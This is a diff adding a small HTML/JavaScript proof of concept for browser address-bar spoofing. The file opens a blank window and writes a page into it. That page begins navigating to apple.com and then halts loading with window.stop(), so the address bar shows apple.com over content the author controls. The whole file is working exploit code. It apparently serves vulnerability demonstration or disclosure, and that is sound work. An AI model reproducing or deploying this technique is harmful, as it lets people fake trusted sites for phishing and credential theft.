@@ -1,0 +1,23 @@
+<button style="font-size: 50px;" onclick="spoof()">Click</button>
+
+<script>
+function spoof() {
+    const w = window.open("about:blank");
+
+    w.document.write(`
+        <h1>You're Address Bar Spoofed</h1>
+
+        <script>
+            setTimeout(() => {
+                location.href = 'https://apple.com';
+            }, 1);
+
+                setTimeout(() => {
+                    window.stop();
+                }, 500);
+
+        <\/script>
+
+    `);
+}
+</script>
